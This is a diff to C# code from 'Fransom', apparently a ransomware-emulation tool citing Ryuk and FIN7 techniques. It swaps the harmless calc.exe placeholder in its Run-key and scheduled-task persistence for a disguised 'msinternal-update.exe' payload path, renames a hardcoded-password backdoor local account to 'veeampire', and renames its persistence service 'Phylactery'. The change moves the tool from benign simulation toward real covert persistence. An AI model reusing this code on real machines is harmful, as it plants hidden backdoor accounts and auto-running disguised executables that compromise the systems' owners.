@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -20,7 +20,7 @@ namespace Fransom
             {
                 string keypath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                 string keyname = "Backup Mgr"; //from Ryuk
-                string command = "\"c:\\windows\\system32\\calc.exe\"";
+                string command = "\"c:\\ProgramData\\DownloadedFiles\\msinternal-update.exe\"";
                 RegistryKey regkey;
                 regkey = Registry.CurrentUser.CreateSubKey(keypath);
                 regkey.SetValue(keyname, command);
@@ -55,7 +55,7 @@ namespace Fransom
         {
             string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
             string TaskName = "FODCleanupTask"; //from FIN7, Carbanak
-            string Command = "\"c:\\windows\\system32\\calc.exe\"";
+            string Command = "\"c:\\ProgramData\\DownloadedFiels\\msinternal-update.exe\"";
             using (TaskService ts = new TaskService())
             {
                 TaskDefinition td = ts.NewTask();
@@ -84,7 +84,7 @@ namespace Fransom
         {
             try
             {
-                string username = "fransom";
+                string username = "veeampire";
                 string password = "Fr@ns0m123!";
                 PrincipalContext context = new PrincipalContext(ContextType.Machine);
                 UserPrincipal user = new UserPrincipal(context);
@@ -106,7 +106,7 @@ namespace Fransom
         {
             try
             {
-                string username = "fransom";
+                string username = "veeampire";
                 DirectoryEntry localDirectory = new DirectoryEntry("WinNT://" + Environment.MachineName.ToString());
                 DirectoryEntries users = localDirectory.Children;
                 DirectoryEntry user = users.Find(username);
@@ -123,7 +123,7 @@ namespace Fransom
         {
             try
             {
-                Console.WriteLine("Installing Fransom service");
+                Console.WriteLine("Installing Phylactery service");
                 // this will be changed to CreateService eventually
                 string FransomBinary = Assembly.GetEntryAssembly().Location;
                 string DisplayName = "Fraktal Fransom Persistence Service";
@@ -151,7 +151,7 @@ namespace Fransom
             try
             {
                 // this will be changed to DeleteService eventually
-                Console.WriteLine("Removing Fransom service");
+                Console.WriteLine("Removing Phylactery service");
                 string FransomBinary = Assembly.GetEntryAssembly().Location;
                 string ServiceName = "Fransom";
                 Process process = new Process();
